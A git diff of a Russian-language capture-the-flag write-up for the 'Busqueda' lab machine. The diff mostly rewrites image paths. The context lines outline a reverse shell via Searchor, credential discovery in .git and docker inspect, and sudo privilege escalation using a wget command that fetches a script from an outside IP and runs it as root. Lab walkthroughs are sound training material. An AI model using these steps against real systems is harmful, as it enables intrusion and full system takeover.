@@ -29,13 +29,9 @@ Service Info: Host: searcher.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
 Главная страница сайта:
 
-![](1.png)
-
 ![](../assets/Busqueda/1.png)
 
 Внизу страницы мы можем найти версию веб-сервиса(Searchor 2.4.0):
-
-![](2.png)
 
 ![](../assets/Busqueda/2.png)
 
@@ -49,32 +45,19 @@ Service Info: Host: searcher.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
 Получаем обратную оболочку.
 
-![](3.png)
-
 ![](../assets/Busqueda/3.png)
 
 ## Privesc
 
 В директории с файламы сайта мы можем обнаружить директорию .git. Перейдем в нее и так обнаружим конфиг, в котором лежит пароль от нашего пользователя.
 
-![](4.png)
-
 ![](../assets/Busqueda/4.png)
-
-![](5.png)
-
 ![](../assets/Busqueda/5.png)
 
 Просмотрим команды, которые мы можем выполнять от sudo.
-
-![](6.png)
-
 ![](../assets/Busqueda/6.png)
 
 Запустим скрипт system-checkup.py. Он нам дает подсказку по его использованию:
-
-![](7.png)
-
 ![](../assets/Busqueda/7.png)
 
 Команда full-checkup вызывает ошибку. Используем остальные две команды. Выведем список доступных контейнеров. Испектируем docker контейнеры.
@@ -83,25 +66,17 @@ Service Info: Host: searcher.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel
 sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect --format='{{json .Config}}' 960873171e2e
 ```
 
-![](8.png)
-
 ![](../assets/Busqueda/8.png)
 
 Мы обнаружили пароль от gitea. Добавим поддомен(gitea.searcher.htb), который мы обнаружили ранее в /etc/hosts/. Перейдем на поддомен и залогинимся с известным паролем.
-
-![](9.png)
 
 ![](../assets/Busqueda/9.png)
 
 В репозитории мы можем обнаружить скрипт, который мы запускали ранее(system-checkup.py).
 
-![](10.png)
-
 ![](../assets/Busqueda/10.png)
 
 Данный скрипт запускает исполняемый файл full-checkup.py.
-
-![](11.png)
 
 ![](../assets/Busqueda/11.png)
 
@@ -122,7 +97,4 @@ wget http://10.10.14.12:6666/full-checkup.sh && chmod +x full-checkup.sh && sudo
 ```
 
 Получаем root.
-
-![](12.png)
-
 ![](../assets/Busqueda/12.png)
